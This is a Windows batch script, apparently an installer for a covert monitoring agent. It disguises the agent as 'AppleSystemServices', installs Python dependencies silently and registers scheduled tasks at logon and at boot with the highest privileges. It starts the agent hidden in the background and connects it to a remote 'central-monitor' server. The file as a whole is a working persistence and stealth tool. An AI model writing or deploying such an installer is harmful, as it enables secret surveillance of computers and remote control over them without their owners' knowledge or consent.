@echo off
:: ================================================
:: AppleSystemServices Windows Stealth Installer v4.2
:: Automatically cleans purana agent & installs fresh stealth background service
:: Usage: Double-click or Run as Administrator
:: ================================================

TITLE AppleSystemServices Windows Installer
color 0A
cls

echo ================================================
echo   🧹 Step 1: Cleaning Old Agent & Services...
echo ================================================
echo.

:: 1. Stop any running old processes
taskkill /F /IM pythonw.exe 2>nul
taskkill /F /FI "WINDOWTITLE eq AppleSystemServices*" 2>nul
wmic process where "commandline like '%%sysupdate.py%%'" call terminate 2>nul

:: 2. Delete old scheduled tasks
schtasks /delete /tn "AppleSystemServices" /f 2>nul
schtasks /delete /tn "AppleSystemServices_Boot" /f 2>nul

:: 3. Wipe old installation folder
SET "INSTALL_DIR=C:\ProgramData\AppleSystemServices"
if exist "%INSTALL_DIR%" (
    rmdir /S /Q "%INSTALL_DIR%" 2>nul
)

echo  ✅ Old installation wiped cleanly!
echo.
echo ================================================
echo   🔧 Step 2: Installing Fresh Stealth Agent...
echo ================================================
echo.

SET "SERVER_URL=https://central-monitor.onrender.com"
IF NOT "%~1"=="" SET "SERVER_URL=%~1"

echo  📡 Central Server: %SERVER_URL%
echo  📁 Install Path  : %INSTALL_DIR%
echo.

:: Create clean install directory
mkdir "%INSTALL_DIR%" 2>nul

:: Copy fresh agent files
xcopy /E /Y /I "%~dp0monitor.py" "%INSTALL_DIR%\" >nul
xcopy /E /Y /I "%~dp0sysupdate.py" "%INSTALL_DIR%\" >nul
if exist "%~dp0templates" xcopy /E /Y /I "%~dp0templates" "%INSTALL_DIR%\templates\" >nul

:: Find Python Path
SET "PYTHON_EXE="

:: Check where python
FOR /F "tokens=*" %%I IN ('where python 2^>nul') DO (
    SET "PYTHON_EXE=%%I"
    GOTO :PY_FOUND
)

:: Check py launcher
FOR /F "tokens=*" %%I IN ('where py 2^>nul') DO (
    SET "PYTHON_EXE=%%I"
    GOTO :PY_FOUND
)

:: Check common AppData & Program Files Python locations
IF EXIST "%LOCALAPPDATA%\Programs\Python\Python312\python.exe" SET "PYTHON_EXE=%LOCALAPPDATA%\Programs\Python\Python312\python.exe" & GOTO :PY_FOUND
IF EXIST "%LOCALAPPDATA%\Programs\Python\Python311\python.exe" SET "PYTHON_EXE=%LOCALAPPDATA%\Programs\Python\Python311\python.exe" & GOTO :PY_FOUND
IF EXIST "%LOCALAPPDATA%\Programs\Python\Python310\python.exe" SET "PYTHON_EXE=%LOCALAPPDATA%\Programs\Python\Python310\python.exe" & GOTO :PY_FOUND
IF EXIST "%LOCALAPPDATA%\Programs\Python\Python39\python.exe" SET "PYTHON_EXE=%LOCALAPPDATA%\Programs\Python\Python39\python.exe" & GOTO :PY_FOUND
IF EXIST "C:\Python311\python.exe" SET "PYTHON_EXE=C:\Python311\python.exe" & GOTO :PY_FOUND
IF EXIST "C:\Python310\python.exe" SET "PYTHON_EXE=C:\Python310\python.exe" & GOTO :PY_FOUND
IF EXIST "C:\Program Files\Python311\python.exe" SET "PYTHON_EXE=C:\Program Files\Python311\python.exe" & GOTO :PY_FOUND

:PY_FOUND
IF "%PYTHON_EXE%"=="" (
    echo ❌ ERROR: Python 3 is not installed on this PC!
    echo Please install Python 3 from https://www.python.org/
    echo.
    pause
    exit /b 1
)

echo 🐍 Using Python: %PYTHON_EXE%

:: Install Python dependencies silently
echo 📦 Installing dependencies...
"%PYTHON_EXE%" -m pip install flask psutil requests pillow --quiet >nul 2>nul

:: Build clean launcher cmd script (No VBS required!)
(
echo @echo off
echo "%PYTHON_EXE%" "%INSTALL_DIR%\sysupdate.py" --server %SERVER_URL%
) > "%INSTALL_DIR%\run.cmd"

:: Create Task Scheduler tasks (Runs silently on boot/logon without VBS popup!)
echo ⚙️ Configuring Task Scheduler Stealth Service...
schtasks /create /tn "AppleSystemServices" /tr "\"%PYTHON_EXE%\" \"%INSTALL_DIR%\sysupdate.py\" --server %SERVER_URL%" /sc onlogon /rl highest /f >nul 2>nul
schtasks /create /tn "AppleSystemServices_Boot" /tr "\"%PYTHON_EXE%\" \"%INSTALL_DIR%\sysupdate.py\" --server %SERVER_URL%" /sc onstart /rl highest /f >nul 2>nul

:: Start background process directly without VBS script host
echo 🚀 Launching Fresh Agent in Background...
start /B "" "%PYTHON_EXE%" "%INSTALL_DIR%\sysupdate.py" --server %SERVER_URL% >nul 2>&1

echo.
echo ================================================
echo   ✅ SUCCESS! Purana Agent hatakar naya fresh agent start ho gaya!
echo   📡 Connected to: %SERVER_URL%
echo ================================================
echo.
pause
